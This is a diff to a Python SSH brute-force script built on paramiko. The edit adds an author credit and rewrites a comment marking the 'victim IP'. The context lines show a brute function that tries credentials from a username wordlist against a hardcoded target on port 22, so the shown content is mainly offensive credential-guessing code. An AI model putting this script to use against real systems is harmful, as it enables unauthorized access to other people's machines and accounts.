@@ -1,6 +1,8 @@
 import paramiko
 import time
 
+# Created by Ivancabrera02
+
 def brute(host,puerto,usuario,password):
 	log = paramiko.util.log_to_file('log.log')
 	cliente = paramiko.SSHClient()
@@ -12,7 +14,7 @@ def brute(host,puerto,usuario,password):
 		print('Fallo la autenticacion')
 
 def main():
-	ip = "192.168.0.2"   #aqui IP victima
+	ip = "192.168.0.2"   #Ip here
 	puerto = 22
 	usuarios = open('usuario.txt','r')
 	usuarios = usuarios.read().split('\n')
